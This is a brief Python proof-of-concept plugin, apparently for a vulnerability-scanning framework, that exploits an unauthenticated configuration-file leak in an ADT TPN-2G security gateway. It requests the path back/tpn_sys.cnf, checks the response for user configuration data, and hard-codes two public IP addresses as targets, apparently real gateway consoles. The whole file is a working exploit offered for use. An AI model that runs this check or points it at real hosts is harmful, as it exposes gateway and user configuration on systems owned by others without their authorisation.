#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 全网行为管理TPN-2G安全网关 ADT configuration file 泄露 
Author    :  a
mail      :  a@lcx.cc
 
refer :  0day
"""
import urlparse
import time

def assign(service, arg):
    if service == 'adtsec_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
     
    url = arg + 'back/tpn_sys.cnf'
    code, head, res, errcode, _ = curl.curl2(url)
    if code==200 and  'ADT configuration file' in res and 'user configuration' in res: 
        security_warning(url)
        
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('adtsec_gateway', 'http://211.144.102.114:8080')[1]) # TPN-2G网关控制台
    audit(assign('adtsec_gateway', 'http://218.94.5.190:8080')[1]) # TPN-2G网关控制台